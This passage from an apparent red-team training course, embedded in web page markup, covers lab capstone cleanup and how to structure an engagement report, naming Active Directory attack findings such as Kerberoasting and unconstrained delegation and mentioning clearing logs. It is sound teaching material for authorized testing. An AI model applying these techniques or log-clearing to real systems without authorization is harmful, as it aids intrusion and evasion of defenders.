you to reconstruct your steps for the report and understand where things went right or wrong.\r\n\r\n### Section 8.4: Post-Operation (Capstone Phase 3)\r\n\r\nIn a real red team engagement, this phase involves:\r\n\r\n*   **Cleanup:** Removing persistence mechanisms, deleting tools/scripts dropped on disk, clearing logs (carefully, and often leaving traces anyway), removing any created accounts or objects.\r\n*   **Verification:** Double-checking that the objective was definitively met.\r\n*   **Knowledge Transfer:** Briefing the client defenders (often done as part of the report).\r\n\r\nIn your lab Capstone:\r\n\r\n*   **Cleanup:** The easiest way is often to revert your lab VMs to a clean state before the operation. If you created persistence, *manually* go back and remove it as a practice exercise.\r\n*   **Verification:** Ensure you have undeniable proof that you achieved your objective (e.g., screenshot of a Domain Admin shell, screenshot accessing the sensitive file share from your compromised path).\r\n\r\n### Section 8.5: Documentation & Reporting (Capstone Phase 4)\r\n\r\nThis is where you synthesize your execution log and findings into a coherent report. A good report is arguably as important as the successful execution itself. It's how you communicate value and help the defenders improve.\r\n\r\n#### 8.5.1 Why Good Reporting Matters\r\n\r\n*   **Communication:** Translates technical actions into understandable impact.\r\n*   **Actionable Intelligence:** Provides defenders with concrete findings and recommendations to fix vulnerabilities.\r\n*   **Demonstrates Value:** Shows the client/management what was achieved and the security posture from an attacker's perspective.\r\n*   **Knowledge Transfer:** Educates the defense team on attacker TTPs.\r\n\r\n#### 8.5.2 Target Audiences\r\n\r\n*   **Executive Summary:** High-level overview for management. Focus on the objective, whether it was achieved, the overall risk demonstrated, and key recommendations. *Non-technical language.*\r\n*   **Technical Details:** For the security team and system administrators. Detailed steps, specific vulnerabilities, affected systems, tools used, evidence. *Technical language.*\r\n\r\n#### 8.5.3 Report Structure\r\n\r\nA standard structure is often used:\r\n\r\n1.  **Executive Summary:** (1-2 pages)\r\n    *   Objective of the engagement.\r\n    *   Summary of findings and overall risk.\r\n    *   Confirmation of whether the objective was met.\r\n    *   Key recommendations.\r\n2.  **Scope and Objectives:**\r\n    *   Clearly state what was in scope (systems, network ranges).\r\n    *   Reiterate the specific objectives.\r\n    *   Mention any RoE or constraints.\r\n3.  **Methodology:**\r\n    *   Briefly describe the approach taken (e.g., simulated initial access, focus on AD environment).\r\n    *   Mention the phases of the operation (recon, PE, LM, etc.).\r\n4.  **Findings:**\r\n    *   This is the core technical section. Organize logically.\r\n    *   Common organization methods:\r\n        *   By kill chain phase (Recon Findings, PE Findings, LM Findings, etc.)\r\n        *   By severity (Critical, High, Medium, Low)\r\n        *   By system/group of systems\r\n    *   For *each* finding (e.g., \"Weak Service Permissions on WKSTN1\", \"Kerberoastable User Account\", \"Unconstrained Delegation on APP01\"):\r\n        *   **Title:** Clear and concise.\r\n        *   **Description:** Explain the vulnerability/misconfiguration.\r\n        *   **Location:** Where was it found (Host, User, AD Object)?\r\n        *   **Impact:** How could an attacker leverage this? (e.g., \"Allows local privilege escalation\", \"Grants access to crackable hash\", \"Allows impersonation of any service\").\r\n        *   **Proof of Concept/Steps to Reproduce:** This is where your execution log comes in! Detail the steps taken to identify and exploit it. Include commands, relevant output, and screenshots as evidence. *Example:* \"Step 1: Ran `icacls \"C:\\Program Files\\Vulnerable"
    }
  ]
}
        </script>
    
    </div>
    <script src="../script.js"></script> <!-- Include script based on flag -->
</body>
</html>
